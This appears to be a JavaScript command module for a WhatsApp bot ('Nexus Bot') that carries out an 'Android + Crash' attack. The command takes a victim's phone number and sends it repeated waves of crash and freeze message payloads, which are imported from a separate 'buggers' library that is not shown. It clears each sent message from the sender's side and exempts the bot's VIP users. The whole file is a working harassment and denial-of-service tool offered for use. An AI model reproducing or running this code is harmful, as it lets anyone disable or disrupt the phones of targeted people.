
export default {
  name: "androidcrash",
  commands: ["androidcrash", "acrash"],
  category: "bugmenu",
  description: "Send Android + Crash bugs",
  usage: ".androidcrash <phone number>",
    permissions: {
  ownerOnly: true,          // Only bot owner can use (overrides everything)
  privateOnly: true   ,      // Can only be used in private chats
  vipRequired: true,        // User must have VIP access
    },
  
  async execute(sock, sessionId, args, m) {
    try {

      if (!args || args.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Usage: .androidcrash <phone number>\nExample: .androidcrash 234 806 7023422\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
        }, { quoted: m })
        return
      }

      let phoneNumber = args.join('').replace(/[^0-9]/g, '')
      
      if (!phoneNumber) {
        await sock.sendMessage(m.chat, { text: "❌ Invalid phone number\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      const target = `${phoneNumber}@s.whatsapp.net`
      
      if (target === m.sender) {
        await sock.sendMessage(m.chat, { text: "❌ Cannot attack yourself\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
        return
      }

      // Check if target is a VIP user by looking up their phone number in the database
      const targetUser = await VIPQueries.getUserByPhone(phoneNumber)
      if (targetUser && targetUser.telegram_id) {
        const targetVipStatus = await VIPQueries.isVIP(targetUser.telegram_id)
        if (targetVipStatus.isVIP) {
          await sock.sendMessage(m.chat, { text: "❌ Cannot attack VIP users\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
          return
        }
      }

      // Import bug functions only when needed
      const {
        delaycrash, delayBlonde, DefJam, HardInvis, XProtexDelayCrash, LocationDelay,
        BlankVisco, bulldoserV3, PhotoDelay, protocolbug6, VerloadXDelayBlank,
        VerloadHardCore, noise, crashinvis, newImage2, StickerPackFreeze
      } = await import("../../lib/buggers/bug.js")

      let progressMsg = await sock.sendMessage(m.chat, { 
        text: `🤖💥 *ANDROID+CRASH ATTACK*\n\n🎯 Target: +${phoneNumber}\n💣 Initializing...` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      let progress = `🤖💥 *ANDROID+CRASH ATTACK*\n\n🎯 Target: +${phoneNumber}\n\n📊 *Progress:*\n\n`

      const bugs = [
          { name: 'CrashInvis', fn: crashinvis, count: 5 },
          { name: 'Delaycrash', fn: delaycrash, count: 2 },
        { name: 'StickerPackFreeze', fn: StickerPackFreeze, count: 2 },
        
        { name: 'DelayBlonde', fn: delayBlonde, count: 2 },
        { name: 'DefJam', fn: DefJam, count: 2 },
        { name: 'LocationDelay', fn: LocationDelay, count: 2 },
        { name: 'HardInvis', fn: HardInvis, count: 1 },
        { name: 'XProtexDelay', fn: XProtexDelayCrash, count: 5 },
        { name: 'BlankVisco', fn: BlankVisco, count: 5 },
        { name: 'BulldoserV3', fn: bulldoserV3, count: 5 },
        { name: 'PhotoDelay', fn: PhotoDelay, count: 5 },
        { name: 'Protocol6', fn: protocolbug6, count: 5 },
        { name: 'VerloadDelay', fn: VerloadXDelayBlank, count: 5 },
        { name: 'VerloadHardCore', fn: VerloadHardCore, count: 5 },
        { name: 'Noise', fn: noise, count: 5 },
        
        { name: 'NewImage2', fn: newImage2, count: 5 }
      ]
      
      let totalWaves = 0

      for (const bug of bugs) {
        progress += `🔄 ${bug.name}: `
        for (let i = 0; i < bug.count; i++) {
          const sentMsg = await bug.fn(sock, target)
          
          if (sentMsg && sentMsg.key) {
            try {
              await sock.chatModify(
                { 
                  clear: { 
                    messages: [{ id: sentMsg.key.id, fromMe: true }] 
                  } 
                }, 
                target
              )
            } catch (error) {
              // Silent fail
            }
          }
          
          progress += `✓ `
          totalWaves++
          await new Promise(resolve => setTimeout(resolve, 2000))
        }
        progress += `(${bug.count}/${bug.count})\n`
        
        await sock.sendMessage(m.chat, { 
          text: progress,
          edit: progressMsg.key
        })
      }

      progress += `\n✅ Successfully sent bug to +${phoneNumber}\n📦 Total: ${totalWaves} waves`

      await sock.sendMessage(m.chat, { 
        text: progress,
        edit: progressMsg.key
      })

      return { success: true }
    } catch (error) {
      console.error("[AndroidCrash] Error:", error)
      await sock.sendMessage(m.chat, { text: "❌ Attack failed: " + error.message + "\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
      return { success: false }
    }
  }
}